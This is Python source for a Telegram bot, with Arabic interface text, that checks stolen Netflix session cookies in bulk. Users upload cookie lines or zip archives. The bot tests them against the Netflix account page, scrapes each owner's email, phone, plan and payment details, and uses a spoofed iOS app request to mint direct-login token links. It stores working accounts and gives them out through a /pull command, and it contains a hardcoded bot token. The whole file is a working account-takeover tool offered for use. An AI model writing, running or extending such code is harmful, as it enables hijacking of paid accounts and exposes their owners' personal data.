import os
import re
import json
import time
import requests
import zipfile
import urllib.parse
import codecs
import logging
import tempfile
import shutil
from datetime import datetime
import uuid
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Owner credit
OWNER_CREDIT = "Huy Vũ - https://huyvu2512.io.vn"

# إعدادات بوت التليجرام
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8890151932:AAGHgPOiXAKwA_Z2b6ZAHPbHFrHSmYKJKxM')
bot = telebot.TeleBot(BOT_TOKEN)

# إعدادات الاشتراك الإجباري (ضع معرف قناتك هنا أو اتركها فارغة إذا لمغن أردت إلغاءها)
REQUIRED_CHANNEL = os.environ.get('REQUIRED_CHANNEL', '@YourChannelUsername') # مثال: '@MyChannel' أو معرف رقمي '-100xxxxxxxxxx'
CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/YourChannelUsername')

# ملف الذاكرة لحفظ الحسابات والإحصائيات
DB_FILE = 'database.json'
db_lock = threading.Lock()

def load_db():
    if not os.path.exists(DB_FILE):
        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"users": [], "accounts": [], "stats": {"checked": 0, "valid": 0}}

def save_db(data):
    with db_lock:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

def add_account_to_db(account_info):
    db = load_db()
    netflix_id = account_info['cookie'].get('NetflixId')
    # التحقق من عدم تكرار الحساب بناءً على البريد أو NetflixId
    exists = any(acc['cookie'].get('NetflixId') == netflix_id or (acc.get('email') != 'Unknown' and acc.get('email') == account_info.get('email')) for acc in db['accounts'])
    if not exists:
        db['accounts'].append(account_info)
        db['stats']['valid'] = len(db['accounts'])
        save_db(db)
        return True
    return False

def check_subscription(user_id):
    if not REQUIRED_CHANNEL:
        return True
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            return True
    except Exception as e:
        logger.error(f"Error checking subscription: {e}")
    return False

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def format_billing_date(raw):
    try:
        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
        return dt.strftime('%d/%m/%Y')
    except Exception:
        try:
            date_part = raw.split('T')[0]
            y, m, d = date_part.split('-')
            return f"{d}/{m}/{y}"
        except Exception:
            return raw

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_next_billing_date(response_text):
    try:
        billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
        if billing_match:
            billing_data = billing_match.group(0)
            date_match = re.search(r'"date":\s*"([^"]+)"', billing_data)
            if date_match:
                return date_match.group(1)
        
        date_match = re.search(r'"nextBillingDate"[^}]+"date":\s*"([^"]+)"', response_text)
        if date_match:
            return date_match.group(1)
    except Exception as e:
        logger.error(f"Error extracting billing date: {e}")
    return "Unknown"

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        
        if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern, text=txt):
            m = re.search(pattern, text)
            return m.group(1).strip() if m else None

        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        plan = unescape_plan(plan) if plan else "Unknown"

        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
        plan_price = unescape_plan(plan_price) if plan_price else "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        member_since = unescape_plan(member_since) if member_since else "Unknown"

        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"

        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
        phone = phone.replace("\\x2B", "+") if phone else "Unknown"

        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"

        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"

        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"

        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"

        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        if email != "Unknown":
            email = urllib.parse.unquote(email)
        
        next_billing = extract_next_billing_date(txt)

        profiles = []
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
            for profile in profile_matches:
                if profile and profile not in profiles:
                    profiles.append(profile)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status_match)
        
        if not is_valid and "NetflixId" in cookie_dict:
            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
            is_premium = is_valid

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'next_billing': format_billing_date(next_billing),
            'cookie': cookie_dict
        }
    except Exception as e:
        logger.error(f"Error checking Netflix cookie: {str(e)}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
                
            generation_time = int(time.time())
            time_remaining = expires - generation_time
            
            return {
                "status": "Success",
                "generation_time": generation_time,
                "expires": expires,
                "time_remaining": time_remaining,
                "token": token,
                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
            }
        else:
            return {"status": "Failure", "error": "No token found in response"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP file: {e}")
        return []

def process_single_line(line):
    netflix_id = extract_netflix_id(line)
    if not netflix_id:
        return None
    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
        token_result = generate_token(netflix_id)
        account_info['token_result'] = token_result
        # حفظ الحساب في الذاكرة المحلية
        add_account_to_db(account_info)
        return account_info
    return None

# دالة للتحقق من الاشتراك الإجباري قبل تنفيذ أي أمر
def send_sub_required_message(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 اشترك في القناة هنا", url=CHANNEL_LINK))
    markup.add(InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
    bot.reply_to(message, "⚠️ **عذراً، يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!**\n\nبعد الاشتراك، اضغط على زر التحقق أدناه.", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message)
        return
        
    db = load_db()
    if user_id not in db["users"]:
        db["users"].append(user_id)
        save_db(db)

    welcome_text = (
        "🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
        "🔹 أرسل لي نص الكوكي، أو ارفع ملف `.txt` أو ملف مضغوط `.zip` وسأقوم بفحصه بسرعة فائقة.\n"
        "🔹 يتم حفظ الحسابات الصالحة تلقائياً في ذاكرة البوت.\n\n"
        "📋 **الأوامر المتاحة:**\n"
        "▪️ `/pull` أو `/getaccount` - لسحب حساب شغال من الذاكرة.\n"
        "▪️ `/stats` - لعرض إحصائيات البوت والحسابات المخزنة.\n"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message)
        return

    db = load_db()
    total_users = len(db.get("users", []))
    total_valid = len(db.get("accounts", []))
    total_checked = db.get("stats", {}).get("checked", 0)

    stats_msg = (
        "📊 **إحصائيات بوت Netflix:**\n\n"
        f"👥 عدد المستخدمين: `{total_users}`\n"
        f"🔍 إجمالي الحسابات المفحوصة: `{total_checked}`\n"
        f"💾 الحسابات الشغالة المخزنة في الذاكرة: `{total_valid}`\n"
    )
    bot.reply_to(message, stats_msg, parse_mode='Markdown')

@bot.message_handler(commands=['pull', 'getaccount'])
def pull_account(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message)
        return

    db = load_db()
    accounts = db.get("accounts", [])
    
    if not accounts:
        bot.reply_to(message, "❌ عذراً، الذاكرة فارغة حالياً ولا توجد حسابات شغالة مخزنة. قم بفحص بعض الملفات أولاً!")
        return

    # سحب أول حساب من الذاكرة وحذفه منها حتى لا يتم إعطاؤه لشخص آخر
    acc = accounts.pop(0)
    db["accounts"] = accounts
    save_db(db)

    res_msg = "🎬 **حساب NETFLIX مسحوب من الذاكرة بنجاح** 🎬\n\n"
    res_msg += f"🌍 البلد: `{acc['country']}`\n"
    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
    
    token_result = acc.get('token_result', {})
    if token_result.get('status') == 'Success':
        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
        res_msg += f"\n📱 **رابط الدخول المباشر:**\n`{mobile_url}`"
    
    bot.reply_to(message, res_msg, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def callback_check_sub(call):
    if check_subscription(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح! يمكنك استخدام البوت الآن.")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        send_welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message)
        return

    temp_dirs = []
    try:
        msg_wait = bot.reply_to(message, "⏳ جاري تحميل الملف وبدء الفحص السريع متعدد الخيوط...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        filename = message.document.file_name
        unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
        temp_dirs.append(unique_dir)
        
        file_path = os.path.join(unique_dir, filename)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        txt_files_to_check = []
        if filename.lower().endswith('.zip'):
            txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
        elif filename.lower().endswith('.txt'):
            txt_files_to_check = [file_path]
            
        if not txt_files_to_check:
            bot.edit_message_text("❌ لم يتم العثور على ملفات نصية صالحة.", message.chat.id, msg_wait.message_id)
            return
            
        all_lines = []
        for txt_file in txt_files_to_check:
            try:
                with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                    all_lines.extend(f.readlines())
            except:
                pass

        # تحديث عداد المفحوصات الكلي في الذاكرة
        db = load_db()
        db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + len(all_lines)
        save_db(db)

        valid_count = 0
        valid_accounts_text = ""

        # استخدام ThreadPoolExecutor للفحص السريع
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(process_single_line, line.strip()) for line in all_lines if line.strip()]
            for future in as_completed(futures):
                acc = future.result()
                if acc:
                    valid_count += 1
                    res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
                    res_msg += f"🌍 البلد: `{acc['country']}`\n"
                    res_msg += f"📦 الباقة: `{acc['plan']}`\n"
                    res_msg += f"💰 السعر: `{acc['plan_price']}`\n"
                    res_msg += f"📅 التجديد: `{acc['next_billing']}`\n"
                    res_msg += f"👥 الملفات: `{acc['profiles']}`\n"
                    res_msg += f"📧 البريد: `{acc['email'].replace(chr(92) + 'x40', '@')}`\n"
                    
                    token_result = acc.get('token_result', {})
                    if token_result.get('status') == 'Success':
                        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
                        res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
                        
                    bot.send_message(message.chat.id, res_msg, parse_mode='Markdown')
                    
                    # تجميع الحسابات لملف نصي نهائي إذا كان العدد كبيرًا
                    valid_accounts_text += f"Email: {acc['email']} | Plan: {acc['plan']} | Expiry: {acc['next_billing']}\n"

        bot.edit_message_text(f"✅ انتهى الفحص. تم العثور على وحفظ ({valid_count}) حساب شغال وفعال في الذاكرة.", message.chat.id, msg_wait.message_id)

        # إذا كانت النظات كثيرة، يمكن إرسال ملف نصي يضم الحسابات
        if valid_count > 0 and valid_accounts_text:
            result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
            with open(result_file_path, 'w', encoding='utf-8') as rf:
                rf.write(valid_accounts_text)
            with open(result_file_path, 'rb') as rf:
                bot.send_document(message.chat.id, rf, caption="📁 ملف يضم ملخص الحسابات الصالحة التي تم استخراجها.")

    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {str(e)}")
    finally:
        for temp_dir in temp_dirs:
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        send_sub_required_message(message)
        return

    content = message.text
    if not content or content.startswith('/'):
        return
        
    msg_wait = bot.reply_to(message, "⏳ جاري فحص الكوكي والتحقق من حالته...")
    netflix_id = extract_netflix_id(content)
    
    if not netflix_id:
        bot.edit_message_text("❌ لم يتم العثور على `NetflixId` صالح في النص.", message.chat.id, msg_wait.message_id)
        return
        
    # تحديث إحصائيات المفحوصات
    db = load_db()
    db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + 1
    save_db(db)

    account_info = check_netflix_cookie({"NetflixId": netflix_id})
    
    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown":
        token_result = generate_token(netflix_id)
        account_info['token_result'] = token_result
        
        # حفظ الحساب في الذاكرة تلقائياً
        add_account_to_db(account_info)
        
        res_msg = "🎬 حساب NETFLIX صالح وفعال 🎬\n\n"
        res_msg += f"🌍 البلد: `{account_info['country']}`\n"
        res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
        res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
        res_msg += f"📅 التجديد: `{account_info['next_billing']}`\n"
        res_msg += f"👥 الملفات: `{account_info['profiles']}`\n"
        res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
        
        if token_result.get('status') == 'Success':
            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_result['token']}")
            res_msg += f"\n📱 رابط الدخول المباشر:\n`{mobile_url}`"
            
        bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
    else:
        bot.edit_message_text("❌ هذا الحساب غير شغال أو معلوماته غير متوفرة (منتهي أو وهمي).", message.chat.id, msg_wait.message_id, parse_mode='Markdown')

if __name__ == '__main__':
    logger.info("Telegram Bot is running...")
    bot.infinity_polling()
